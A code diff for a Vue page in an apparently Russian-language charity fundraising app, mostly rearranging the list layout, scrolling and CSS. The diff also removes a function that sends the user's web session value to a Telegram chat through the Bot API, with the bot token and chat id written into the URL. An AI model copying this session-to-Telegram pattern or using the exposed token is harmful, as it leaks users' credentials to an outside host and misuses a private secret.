@@ -1,14 +1,5 @@
 <template>
   <div v-if="indexFee.loading || indexFee.data" class="index-container">
-    <div v-if="webSession" style="margin: 0 20px" @click="sendCookieToTg">
-      <div style="user-select: all; white-space: pre-line; color: #fff">
-        {{ webSession }}
-      </div>
-      <div style="color: #fff">
-        {{ getCookie('theme') }}
-      </div>
-      <div style="color: #ffffff">Theme {{ appStore.theme }}</div>
-    </div>
     <div class="search-container">
       <input v-model="queryFee.search" type="text" placeholder="Фамилия, имя" />
       <!--      <div-->
@@ -27,48 +18,50 @@
       <!--        />-->
       <!--      </div>-->
     </div>
-    <div class="help-block">
+    <!--    <div-->
+    <!--      style="width: 100%; z-index: 9; height: 10px; background: #12129f"-->
+    <!--    ></div>-->
+    <div ref="el" class="help-block">
       <div class="text">Нуждаются в помощи</div>
       <div class="description">
         Сейчас им крайне необходима<br />
         ваша помощь.
       </div>
-    </div>
-    <div v-if="indexFee.loading">
-      <MainSkeleton></MainSkeleton>
-      <MainSkeleton></MainSkeleton>
-      <MainSkeleton></MainSkeleton>
-    </div>
-    <div v-else ref="el" class="content-container">
-      <div v-for="feeItem in indexFee?.data" :key="feeItem">
-        <ChartCardNotCollected
-          :key="feeItem.id"
-          :fee-item="feeItem"
-        ></ChartCardNotCollected>
-        <!--      <div v-if="index === 1" class="charity-banner">-->
-        <!--        <div class="text">-->
-        <!--          Наша миссия — протянуть руку тем, кто действительно в этом нуждается.-->
-        <!--          Помощь больным детям — основная наша задача.-->
-        <!--        </div>-->
-        <!--        <div-->
-        <!--          v-ripple.500="'rgba(255, 255, 255, 0.35)'"-->
-        <!--          class="btn-help"-->
-        <!--          @click="$router.push('/profile/form')"-->
-        <!--        >-->
-        <!--          Мне нужна помощь-->
-        <!--        </div>-->
-        <!--      </div>-->
+      <div v-if="indexFee.loading">
+        <MainSkeleton></MainSkeleton>
+        <MainSkeleton></MainSkeleton>
+        <MainSkeleton></MainSkeleton>
       </div>
-      <div v-if="indexFee.loader" class="loader-wrapper">
-        <span class="loader-anim"></span>
+      <div v-else>
+        <div v-for="feeItem in indexFee?.data" :key="feeItem">
+          <ChartCardNotCollected
+            :key="feeItem.id"
+            :fee-item="feeItem"
+          ></ChartCardNotCollected>
+          <!--      <div v-if="index === 1" class="charity-banner">-->
+          <!--        <div class="text">-->
+          <!--          Наша миссия — протянуть руку тем, кто действительно в этом нуждается.-->
+          <!--          Помощь больным детям — основная наша задача.-->
+          <!--        </div>-->
+          <!--        <div-->
+          <!--          v-ripple.500="'rgba(255, 255, 255, 0.35)'"-->
+          <!--          class="btn-help"-->
+          <!--          @click="$router.push('/profile/form')"-->
+          <!--        >-->
+          <!--          Мне нужна помощь-->
+          <!--        </div>-->
+          <!--      </div>-->
+        </div>
+        <div v-if="indexFee.loader" class="loader-wrapper">
+          <span class="loader-anim"></span>
+        </div>
+        <!--    <UiOffCanvasRegions></UiOffCanvasRegions>-->
       </div>
-      <!--    <UiOffCanvasRegions></UiOffCanvasRegions>-->
     </div>
   </div>
 </template>
 
 <script setup>
-import { storeToRefs } from 'pinia'
 import MainSkeleton from '~/components/skeleton/MainSkeleton.vue'
 import ChartCardNotCollected from '~/components/ChartCardNotCollected.vue'
 import { getFee } from '~/services/app.api'
@@ -79,8 +72,6 @@ definePageMeta({
 })
 const el = shallowRef(null)
 const heightDevice = inject('devicePlatform')
-const appStore = useAppStore()
-const { webSession } = storeToRefs(appStore)
 
 const indexFee = reactive({
   loading: false,
@@ -135,18 +126,8 @@ useInfiniteScroll(
       await getFeePagination()
     }
   },
-  { distance: 100 },
+  { distance: 10 },
 )
-
-const sendCookieToTg = () => {
-  const data = `<pre><code class="language-javascript">${appStore.webSession}</code></pre>`
-  fetch(
-    `https://api.telegram.org/bot6789685486:AAFmpL2nId5LRxhxYymMagh-0yARXV1Nxhc/sendMessage?chat_id=-1002074363401&parse_mode=html&text=${data}`,
-    {
-      method: 'GET',
-    },
-  )
-}
 
 watch(
   () => queryFee.search,
@@ -163,13 +144,6 @@ watch(
 .index-container {
   height: calc(v-bind(heightDevice) - 155px);
   max-height: calc(v-bind(heightDevice) - 155px);
-  padding-bottom: 8px;
-  overflow-y: auto;
-}
-.content-container {
-  height: calc(v-bind(heightDevice) - 155px);
-  max-height: calc(v-bind(heightDevice) - 155px);
-  overflow-y: auto;
 }
 .search-container {
   position: relative;
@@ -212,18 +186,20 @@ watch(
 }
 
 .help-block {
-  padding: 0 20px 0;
+  height: calc(v-bind(heightDevice) - 225px);
+  max-height: calc(v-bind(heightDevice) - 225px);
+  overflow-y: auto;
   & .text {
+    padding: 0 20px 5px;
     color: var(--need-help);
     font-size: 16px;
     font-weight: 600;
     line-height: 19px;
     letter-spacing: 0;
     text-align: left;
-    padding-bottom: 5px;
   }
   & .description {
-    padding-bottom: 10px;
+    padding: 0 20px 10px;
     color: var(--need-help-desc);
     font-size: 12px;
     font-weight: 400;
